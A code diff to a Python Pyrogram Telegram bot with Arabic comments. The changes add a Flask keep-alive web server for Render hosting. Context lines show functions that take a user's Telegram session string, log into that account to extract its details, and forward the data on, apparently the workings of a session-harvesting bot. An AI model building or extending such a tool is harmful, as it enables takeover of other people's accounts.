@@ -1,12 +1,30 @@
 import os
 import asyncio
 import logging
+import threading
+from flask import Flask
 from pyrogram import Client, filters
 from pyrogram.types import Message
 import requests
 import sys
 
-# ====== قراءة المتغيرات البيئية ======
+# ====== إعدادات Flask ======
+app_flask = Flask(__name__)
+
+@app_flask.route('/')
+def home():
+    return "Bot is running!"
+
+@app_flask.route('/health')
+def health():
+    return "OK"
+
+def run_flask():
+    """تشغيل Flask في منفذ Render"""
+    port = int(os.environ.get("PORT", 5000))
+    app_flask.run(host='0.0.0.0', port=port)
+
+# ====== إعدادات البوت ======
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
@@ -26,7 +44,7 @@ app = Client(
     api_hash=API_HASH
 )
 
-# ====== دالة استخراج المعلومات ======
+# ====== دوال استخراج وإرسال المعلومات (نفس الكود القديم) ======
 async def extract_session_info(session_string):
     try:
         temp_client = Client(
@@ -51,7 +69,6 @@ async def extract_session_info(session_string):
     except Exception as e:
         return {"error": str(e)}
 
-# ====== إرسال البيانات ======
 async def forward_info(data):
     try:
         text = f"""
@@ -100,6 +117,18 @@ async def extract_cmd(client, message):
     except asyncio.TimeoutError:
         await message.reply("⏳ انتهى الوقت.")
 
-# ====== التشغيل ======
-if __name__ == "__main__":
+def run_bot():
+    """تشغيل البوت في حلقة منفصلة"""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
     app.run()
+
+# ====== التشغيل الرئيسي ======
+if __name__ == "__main__":
+    # تشغيل Flask في Thread منفصل
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.daemon = True
+    flask_thread.start()
+    
+    # تشغيل البوت في Thread أساسي
+    run_bot()
